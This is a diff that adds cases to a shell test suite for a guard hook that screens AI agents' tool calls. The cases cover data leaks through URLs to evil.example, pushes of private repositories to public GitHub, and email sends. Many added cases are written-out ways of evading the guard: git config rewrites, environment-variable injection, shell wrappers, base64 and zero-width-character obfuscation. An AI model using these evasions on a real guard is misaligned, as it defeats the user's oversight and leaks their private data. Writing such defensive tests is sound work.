@@ -191,9 +191,14 @@ check "WebFetch encoded spaces in path (allow)" allow '{"tool_name":"WebFetch","
 check "WebFetch JSON-escaped @ (\\u0040) in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?e=jordan\u0040example.com","prompt":"x"}}'
 check "WebFetch JSON-escaped slashes (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https:\/\/jobs.example.com\/job?id=1","prompt":"x"}}'
 check "WebFetch non-ASCII escape in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/caf\u00e9/ingenieur","prompt":"x"}}'
-check "WebFetch last name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/testerson/x","prompt":"x"}}'
-check "WebFetch last name in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://testerson.evil.example/a","prompt":"x"}}'
-check "WebFetch last name in fragment (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/a#testerson","prompt":"x"}}'
+check "WebFetch full name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/jordan-testerson/x","prompt":"x"}}'
+check "WebFetch first and last name apart in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/testerson/x/jordan","prompt":"x"}}'
+check "WebFetch full name run together in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/jordantesterson","prompt":"x"}}'
+check "WebFetch last name, first name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/testerson_jordan","prompt":"x"}}'
+check "WebFetch full name in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://jordan.testerson.evil.example/a","prompt":"x"}}'
+check "WebFetch full name in fragment (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/a#jordan-testerson","prompt":"x"}}'
+check "J4-06 surname alone in a job path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://careers.example.org/jobs/testerson","prompt":"x"}}'
+check "J4-06 surname alone in an employer host (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.testerson-industries.example/x","prompt":"x"}}'
 check "WebFetch last name inside a longer word in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/testersonville-plant","prompt":"x"}}'
 check "WebFetch phone in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://2158675309.evil.example/","prompt":"x"}}'
 check "WebFetch email as (at) and (dot) (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/jordan(at)example(dot)com","prompt":"x"}}'
@@ -438,6 +443,113 @@ if [ "$IMPL" = sh ]; then
   RUN="$RUN_DEFAULT"
 fi
 
+echo "== guard ($IMPL): Codex review 2026-10-13 (push check)"
+# exec_command / shell with tool_input.workdir: git runs there, not in the session folder.
+wdjson() { # wdjson <cwd> <command> <workdir JSON value>
+  printf '{"session_id":"x","hook_event_name":"PreToolUse","cwd":%s,"tool_name":"exec_command","tool_input":{"cmd":%s,"workdir":%s}}' "$(j "$1")" "$(j "$2")" "$3"
+}
+check "J1-01 Codex workdir = public repo, cwd = private (deny)" deny "$(wdjson "$TN/priv" "git $PU origin HEAD" "$(j "$TN/pub")")"
+check "J1-01 Codex relative workdir = public repo (deny)" deny "$(wdjson "$TN" "git $PU origin HEAD" '"pub"')"
+check "J1-01 Codex workdir that doesn't exist (deny)" deny "$(wdjson "$TN/priv" "git $PU origin HEAD" "$(j "$TN/no-such-folder")")"
+check "J1-01 Codex workdir that isn't text (deny)" deny "$(wdjson "$TN/priv" "git $PU origin HEAD" '["x"]')"
+check "J1-01 ok: Codex workdir = private repo, cwd = public (allow)" allow "$(wdjson "$TN/pub" "git $PU origin main" "$(j "$TN/priv")")"
+check "J1-01 ok: Codex workdir null (allow)" allow "$(wdjson "$TN/priv" "git $PU origin main" 'null')"
+check "J3-01 git -C a folder that doesn't exist, remote name (deny)" deny "$(shelljson "$TN/priv" "git -C /nonexistent/JobHQ $PU origin HEAD")"
+check "J3-01 PowerShell: git -C C:\\Users\\Alex\\JobHQ (not here) $PU (deny)" deny "$(shelljson "$TN/priv" "git -C C:\\Users\\Alex\\JobHQ $PU origin HEAD" PowerShell)"
+check "J3-01 cd to a folder that doesn't exist, then $PU (deny)" deny "$(shelljson "$TN/priv" "cd /nonexistent/JobHQ && git $PU origin HEAD")"
+if [ -n "$WIN" ]; then
+  check "J3-01 PowerShell: git -C <backslash path> $PU, public (deny)" deny "$(shelljson "$TN/none" "git -C $(cygpath -w "$T/pub") $PU origin HEAD" PowerShell)"
+  check "J3-01 PowerShell: git -C <backslash path> $PU, private (allow)" allow "$(shelljson "$TN/none" "git -C $(cygpath -w "$T/priv") $PU origin main" PowerShell)"
+else
+  skip "J3-01 PowerShell backslash paths" "needs Windows paths"
+fi
+mk rewrite "$PRIVURL"
+git -C "$T/rewrite" config "url.$PUBURL.insteadOf" reviewdest
+git -C "$T/rewrite" config "url.$PUBURL.pushInsteadOf" pushdest
+mk fork "$PUBURL"; git -C "$T/fork" config "url.$PRIVURL.pushInsteadOf" "$PUBURL"
+check "J5-04 saved url.<public>.insteadOf, $PU to that word (deny)" deny "$(shelljson "$TN/rewrite" "git $PU reviewdest HEAD")"
+check "J5-04 saved url.<public>.pushInsteadOf, $PU to that word (deny)" deny "$(shelljson "$TN/rewrite" "git $PU pushdest HEAD")"
+check "J5-04 ok: $PU to the private origin of a folder with rewrites (allow)" allow "$(shelljson "$TN/rewrite" "git $PU origin main")"
+check "J5-04 ok: fetch public, pushInsteadOf private: $PU origin (allow)" allow "$(shelljson "$TN/fork" "git $PU origin main")"
+check "J5-04 ok: fetch public, pushInsteadOf private: $PU <public URL> (allow)" allow "$(shelljson "$TN/fork" "git $PU $PUBURL main")"
+check "J3-02 attached -curl.<public>.insteadOf (deny)" deny "$(shelljson "$TN/priv" "git -curl.$PUBURL.insteadOf=reviewdest $PU reviewdest HEAD")"
+check "J3-02 --config-env=remote.origin.url=U (deny)" deny "$(shelljson "$TN/priv" "export U=$PUBURL; git --config-env=remote.origin.url=U $PU origin HEAD")"
+check "J3-02 --config-env remote.origin.url=U, separate word (deny)" deny "$(shelljson "$TN/priv" "git --config-env remote.origin.url=U $PU origin HEAD")"
+check "J3-03 gh re\\<newline>po create --public (deny)" deny "$(shelljson "$TN" $'gh re\\\npo create leaked --public')"
+check "J3-03 g\\<newline>it $PU <public URL> (deny)" deny "$(shelljson "$TN/none" $'g\\\nit '"$PU $PUBURL HEAD")"
+check "J3-03 PowerShell backtick continuation, public (deny)" deny "$(shelljson "$TN/pub" "git $PU \`"$'\n'"origin main" PowerShell)"
+check "J3-03 ok: PowerShell backtick continuation, private (allow)" allow "$(shelljson "$TN/priv" "git $PU \`"$'\n'"origin main" PowerShell)"
+check "J3-04 gh api graphql --input <file> (deny)" deny "$(shelljson "$TN" 'gh api graphql --input imports/request.json')"
+check "J3-04 gh api graphql -F query=@<file> (deny)" deny "$(shelljson "$TN" 'gh api graphql -F query=@imports/q.graphql')"
+check "J3-04 gh api graphql -f query=@- (deny)" deny "$(shelljson "$TN" 'gh api graphql -f query=@-')"
+check "J3-04 gh api graphql -f query=\"\$Q\" (deny)" deny "$(shelljson "$TN" 'gh api graphql -f query="$Q"')"
+check "J3-04 gh api graphql -f query=\"\$(cat q)\" (deny)" deny "$(shelljson "$TN" 'gh api graphql -f query="$(cat q.graphql)"')"
+check "J3-04 ok: gh api graphql query with \$variables (allow)" allow "$(shelljson "$TN" "gh api graphql -f query='query(\$login:String!){user(login:\$login){name}}' -F login=octocat")"
+check "J3-04 gh api PATCH <private> -F private=@<file> (deny)" deny "$(shelljson "$TN" 'gh api -X PATCH repos/octocat/this-repo-does-not-exist-zz9 -F private=@flag.txt')"
+mk alias2 "$PRIVURL"
+git -C "$T/alias2" config alias.ship "!git $PU $PRIVURL HEAD; git $PU $PUBURL HEAD"
+git -C "$T/alias2" config alias.shipok "!git fetch && git $PU $PRIVURL HEAD"
+git -C "$T/alias2" config alias.shipcd "!cd $TN/pub && git $PU"
+git -C "$T/alias2" config alias.shipc "!git -C $TN/pub $PU"
+check "J5-05 shell alias, second $PU public (deny)" deny "$(shelljson "$TN/alias2" 'git ship')"
+check "J5-05 shell alias that cds first (deny)" deny "$(shelljson "$TN/alias2" 'git shipcd')"
+check "J5-05 shell alias with git -C (deny)" deny "$(shelljson "$TN/alias2" 'git shipc')"
+check "J5-05 ok: shell alias fetch && $PU private (allow)" allow "$(shelljson "$TN/alias2" 'git shipok')"
+check "J5-07 PowerShell \$env:GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "\$env:GIT_CONFIG_COUNT='1'; \$env:GIT_CONFIG_KEY_0='remote.origin.pushurl'; \$env:GIT_CONFIG_VALUE_0='$PUBURL'; git $PU origin HEAD" PowerShell)"
+check "J5-07 Codex shell_command \$env:GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "\$env:GIT_CONFIG_COUNT='1'; \$env:GIT_CONFIG_KEY_0='remote.origin.pushurl'; \$env:GIT_CONFIG_VALUE_0='$PUBURL'; git $PU origin HEAD" shell_command)"
+check "J5-07 PowerShell Set-Item Env:GIT_DIR then $PU (deny)" deny "$(shelljson "$TN/priv" "Set-Item -Path Env:GIT_DIR -Value '$TN/pub/.git'; git $PU" PowerShell)"
+check "J5-07 [Environment]::SetEnvironmentVariable('GIT_...') then $PU (deny)" deny "$(shelljson "$TN/priv" "[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT', '1'); git $PU origin HEAD" PowerShell)"
+check "J5-07 declare -x GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "declare -x GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=$PUBURL; git $PU origin HEAD")"
+check "J5-07 ok: PowerShell \$env:PATH change, then $PU private (allow)" allow "$(shelljson "$TN/priv" "\$env:Path += ';C:\\tools'; git $PU origin main" PowerShell)"
+check "J5-08 powershell -Command \"git $PU <public>\" (deny)" deny "$(shelljson "$TN/priv" "powershell -NoProfile -Command \"git $PU $PUBURL HEAD\"" shell_command)"
+check "J5-08 bash -c 'git $PU <public>' (deny)" deny "$(shelljson "$TN/priv" "bash -c 'git $PU $PUBURL HEAD'" shell_command)"
+check "J5-08 cmd /c \"git $PU <public>\" (deny)" deny "$(shelljson "$TN/priv" "cmd /c \"git $PU $PUBURL HEAD\"" shell_command)"
+check "J5-08 pwsh -ExecutionPolicy Bypass -c \"git $PU <public>\" (deny)" deny "$(shelljson "$TN/priv" "pwsh -ExecutionPolicy Bypass -c \"git $PU $PUBURL HEAD\"" shell_command)"
+check "J5-08 bash -lc 'cd pub && git $PU' (deny)" deny "$(shelljson "$TN" "bash -lc 'cd pub && git $PU'")"
+check "J5-08 Codex argv [bash, -lc, cd pub && git $PU] (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN"),\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"cd pub && git $PU\"]}}"
+check "J5-08 pwsh -wd pub -Command \"git $PU\" (deny)" deny "$(shelljson "$TN" "pwsh -wd pub -Command \"git $PU\"" shell_command)"
+check "J5-08 ok: powershell -Command \"git $PU <private>\" (allow)" allow "$(shelljson "$TN/priv" "powershell -NoProfile -Command \"git $PU $PRIVURL HEAD\"" shell_command)"
+check "J5-08 ok: Codex argv [bash, -lc, cd priv && git $PU origin main] (allow)" allow "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN"),\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"cd priv && git $PU origin main\"]}}"
+check "cd in a subshell doesn't last: (cd <private>); git $PU from public (deny)" deny "$(shelljson "$TN/pub" "(cd $TN/priv); git $PU origin main")"
+check "cd inside bash -c doesn't last: bash -c 'cd <private>'; git $PU (deny)" deny "$(shelljson "$TN/pub" "bash -c 'cd $TN/priv'; git $PU origin main")"
+check "ok: cd <private> && git $PU from a folder with no remotes (allow)" allow "$(shelljson "$TN/none" "cd $TN/priv && git $PU origin main")"
+
+echo "== guard ($IMPL): Codex review 2026-10-13 (connectors, browser, false positives)"
+check "J3-06 mail messages-send-and-get (deny)" deny '{"tool_name":"mcp__mail__messages-send-and-get","tool_input":{"to":"a@example.com"}}'
+check "J3-06 send_email_and_get (deny)" deny '{"tool_name":"mcp__mail__send_email_and_get","tool_input":{}}'
+check "J3-06 ok: get_post (allow)" allow '{"tool_name":"mcp__forum__get_post","tool_input":{}}'
+check "J3-07 camelCase addFileCollaborators (deny)" deny '{"tool_name":"mcp__drive__addFileCollaborators","tool_input":{"collaborators":["a@example.com"]}}'
+check "J3-07 camelCase inviteAttendees (deny)" deny '{"tool_name":"mcp__cal__inviteAttendees","tool_input":{}}'
+check "J3-07 PascalCase UpdatePermissions (deny)" deny '{"tool_name":"mcp__docs__UpdatePermissions","tool_input":{}}'
+check "J3-07 ok: camelCase listFileCollaborators (allow)" allow '{"tool_name":"mcp__drive__listFileCollaborators","tool_input":{}}'
+check "J3-07 ok: camelCase calendar createEvent, nobody invited (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__createEvent","tool_input":{"summary":"Interview"}}'
+SHY="$(printf 'www.link\xc2\xadedin.com')"; ZWS="$(printf 'www.linked\xe2\x80\x8bin.com')"; WJ="$(printf 'mail.goo\xe2\x81\xa0gle.com')"
+check "J3-09 browser to LinkedIn with a soft hyphen (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://$SHY/\"}}"
+check "J3-09 browser to LinkedIn with a zero-width space (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://$ZWS/\"}}"
+check "J3-09 browser to Gmail with a word joiner (deny)" deny "{\"tool_name\":\"mcp__Claude_Browser__navigate\",\"tool_input\":{\"url\":\"https://$WJ/\"}}"
+check "J3-09 browser to LinkedIn with %C2%AD (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.link%C2%ADedin.com/feed"}}'
+check "J3-09 browser code to LinkedIn with a soft hyphen (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_evaluate\",\"tool_input\":{\"function\":\"() => { window.location = 'https://$SHY/' }\"}}"
+check "J3-09 ok: soft hyphen on a job site (allow)" allow "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://jobs.example.com/$(printf 'engi\xc2\xadneer')\"}}"
+check "J4-02 ok: Outlook calendar create_event, nobody invited (allow)" allow '{"tool_name":"mcp__outlook_calendar__create_event","tool_input":{"subject":"Interview","attendees":[]}}'
+check "J4-02 ok: Outlook create_event, nobody invited (allow)" allow '{"tool_name":"mcp__outlook__create_event","tool_input":{"subject":"Interview"}}'
+check "J4-02 Outlook calendar create_event with attendees (deny)" deny '{"tool_name":"mcp__outlook_calendar__create_event","tool_input":{"subject":"x","attendees":[{"email":"a@example.com"}]}}'
+check "J4-02 Outlook calendar update_event (deny)" deny '{"tool_name":"mcp__outlook_calendar__update_event","tool_input":{}}'
+check "J4-02 Superhuman create_or_update_event (deny)" deny '{"tool_name":"mcp__claude_ai_Superhuman_Mail__create_or_update_event","tool_input":{}}'
+check "J4-02 Outlook send_mail still blocked (deny)" deny '{"tool_name":"mcp__outlook_calendar__send_mail","tool_input":{}}'
+check "J4-03 ok: rg for smtplib in a resume (allow)" allow "$(shelljson "$TN/priv" "rg -n 'smtplib|smtpclient' imports/resume.md")"
+check "J4-03 ok: git commit -m mentioning smtplib (allow)" allow "$(shelljson "$TN/priv" "git commit -m 'Record experience with smtplib'")"
+check "J4-03 ok: grep for sendmail (allow)" allow "$(shelljson "$TN/priv" 'grep -c sendmail notes.txt')"
+check "J4-03 text piped into sendmail (deny)" deny "$(shelljson "$TN/priv" 'cat note.txt | sendmail -t')"
+check "J4-03 pwsh -c with Net.Mail.SmtpClient (deny)" deny "$(shelljson "$TN/priv" "pwsh -c \"\$c = New-Object Net.Mail.SmtpClient('smtp.example.com'); \$c.Send('a@example.com','b@example.com','s','b')\"" PowerShell)"
+check "git send-email (deny)" deny "$(shelljson "$TN/priv" 'git send-email --to a@example.com 0001.patch')"
+check "J4-04 ok: FromBase64String to read text (allow)" allow "$(shelljson "$TN/priv" "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8='))" PowerShell)"
+check "J4-04 FromBase64String into the call operator (deny)" deny "$(shelljson "$TN/priv" "& ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2l0'))) $PU origin" PowerShell)"
+check "program name built in brackets: & ('gi' + 't') $PU (deny)" deny "$(shelljson "$TN/priv" "& ('gi' + 't') $PU origin main" PowerShell)"
+check "J4-04 [scriptblock]::Create (deny)" deny "$(shelljson "$TN/priv" "& ([scriptblock]::Create(\$t))" PowerShell)"
+check "J4-05 ok: gh api -X GET <public> with -f (allow)" allow "$(shelljson "$TN" 'gh api -X GET repos/octocat/Hello-World/releases -f per_page=1')"
+check "J4-05 ok: gh api --method=get <public> with -F (allow)" allow "$(shelljson "$TN" 'gh api --method=get repos/octocat/Hello-World/issues -F state=open')"
+check "J4-05 gh api fields without -X to <public> (deny)" deny "$(shelljson "$TN" 'gh api repos/octocat/Hello-World/issues -f title=x')"
+
 echo "== guard ($IMPL): input shape"
 check "empty stdin (deny)" deny ''
 check "whitespace-only stdin (deny)" deny $'  \n'
@@ -454,7 +566,7 @@ elif ! command -v ssh >/dev/null 2>&1; then
   skip "SSH alias cases" "no ssh client"
 else
   mkdir -p "$T/bin"
-  printf 'Host github-work\n  HostName github.com\n  User git\nHost myserver\n  HostName example.com\n' > "$T/sshconfig"
+  printf 'Host github-work\n  HostName github.com\n  User git\nHost github-dot\n  HostName github.com.\nHost myserver\n  HostName example.com\n' > "$T/sshconfig"
   printf '#!/bin/sh\nexec "%s" -F "%s" "$@"\n' "$(command -v ssh)" "$T/sshconfig" > "$T/bin/ssh"; chmod +x "$T/bin/ssh"
   OLDPATH="$PATH"; export PATH="$T/bin:$PATH"
   mk alias "git@github-work:octocat/Hello-World.git"
@@ -462,6 +574,10 @@ else
   mk aliaspriv "git@github-work:octocat/this-repo-does-not-exist-zz9.git"
   mk othersrv "git@myserver:me/jobs.git"
   mk localpath "$T/bare-local.git"
+  mk aliasdot "git@github-dot:octocat/Hello-World.git"
+  mk aliasdotpriv "git@github-dot:octocat/this-repo-does-not-exist-zz9.git"
+  check "J3-05 SSH alias with HostName github.com. (trailing dot), public (deny)" deny "$(shelljson "$TN/aliasdot" "git $PU origin main")"
+  check "J3-05 ok: SSH alias with trailing-dot HostName, private (allow)" allow "$(shelljson "$TN/aliasdotpriv" "git $PU origin main")"
   check "SSH alias for GitHub, public (deny)" deny "$(shelljson "$TN/alias" "git $PU origin main")"
   check "ssh:// alias for GitHub, public (deny)" deny "$(shelljson "$TN/aliasurl" "git $PU")"
   check "SSH alias for GitHub, private (allow)" allow "$(shelljson "$TN/aliaspriv" "git $PU origin main")"
@@ -559,6 +675,8 @@ if [ "$IMPL" = sh ]; then
     pp "pre-push, SSH alias, private (allow)" 0 aliaspriv origin
     pp "pre-push, SSH alias for another server (allow)" 0 othersrv origin
     pp "pre-push, local folder remote (allow)" 0 localpath origin
+    pp "J3-05 pre-push, SSH alias with trailing-dot HostName, public (block)" 1 aliasdot origin
+    pp "J3-05 pre-push, SSH alias with trailing-dot HostName, private (allow)" 0 aliasdotpriv origin
     export PATH="$OLDPATH"
   fi
   # End to end through git itself (core.hooksPath), pushing only to local bare repos.
@@ -576,6 +694,13 @@ if [ "$IMPL" = sh ]; then
   else fail=$((fail + 1)); echo "FAIL  e2e: failed, but not because of the hook:"; sed 's/^/      | /' "$T/e2e"; fi
   if git -C "$T/priv" "$PU" -q origin HEAD:refs/heads/x >"$T/e2e2" 2>&1; then pass=$((pass + 1)); echo "PASS  e2e: real git $PU to a non-GitHub (local) URL allowed"
   else fail=$((fail + 1)); echo "FAIL  e2e: allowed case failed"; sed 's/^/      | /' "$T/e2e2"; fi
+  # A saved insteadOf rewrite: git hands the hook the rewritten (public-looking) URL, not the word typed.
+  git -C "$T/priv" config "url.$TN/fake/github.com/octocat/Hello-World.git.insteadOf" reviewdest
+  git -C "$T/priv" config core.hooksPath "$TN/m/hooks"
+  if git -C "$T/priv" "$PU" -q reviewdest HEAD:refs/heads/y >"$T/e2e3" 2>&1; then fail=$((fail + 1)); echo "FAIL  e2e: git $PU through a saved insteadOf rewrite to a public repository was not stopped"
+  elif grep -q 'PUBLIC' "$T/e2e3"; then pass=$((pass + 1)); echo "PASS  e2e: J5-04 saved insteadOf rewrite to public GitHub stopped by pre-push"
+  else fail=$((fail + 1)); echo "FAIL  e2e: insteadOf case failed, but not because of the hook:"; sed 's/^/      | /' "$T/e2e3"; fi
+  git -C "$T/priv" config --unset "url.$TN/fake/github.com/octocat/Hello-World.git.insteadOf"
 
   echo "== .githooks/commit-msg"
   CM="$REPO/.githooks/commit-msg"
